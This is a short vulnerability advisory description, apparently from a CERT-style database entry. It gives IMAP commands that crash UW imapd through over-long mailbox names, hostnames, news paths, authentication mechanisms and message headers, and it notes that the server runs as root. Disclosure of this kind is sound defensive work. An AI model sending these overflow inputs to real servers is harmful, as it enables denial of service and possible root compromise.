  "Description": " A.\tTry this:\n\n\ttelnet localhost imap\n\tx LOGIN yourname yourpass\n\tx SELECT \"/tmp/aaaaaaaaaaa....\"\n\n\twhere aaaa is a little over 1024 chars. This also works with\n\talmost any other command (c-client/mail.c -- I guess. but maybe\n\tits in osdep/unix).\n\n B.\tOr try this\n\n\tx SELECT \"{aaaaaaaaa...}\"\n\n\taaa is supposed to be a remote hostname, the resulting segfault\n\tis in tcp_unix.c.\n\n C.\tOr try this\n\n\tx SELECT \"{news.yourdomain/service=nntp}#news.aaaaaaa...\"\n\n\tThis segfault is in c-client/nntp.c.\n\n D.\tx AUTHENTICATE aaaaaaaaa....\n\n\twhere aaaa... is a ridiculously long auth flavor.\n\timapd runs as root at the time the segfault occurs.\n\n[note that section D appears to be the same vul described in VU#7733]\n\n E.\tSend a message to yourself with a header line (again, >1024 A's)\n\n\tX-Bogus-AAAAAAAAAAAAAAA...: xxx\n\n\tThen tell imapd to do this:\n\n\tx fetch 1 rc822.header.lines (from)\n\n\tThe error is in mail_filter(mail.c)\n\n F.\tPut a ridiculously long From line into a message, and try\n\n\tx search from joe\n\n\t(I'm not sure why this segfaults, but it does here...)",
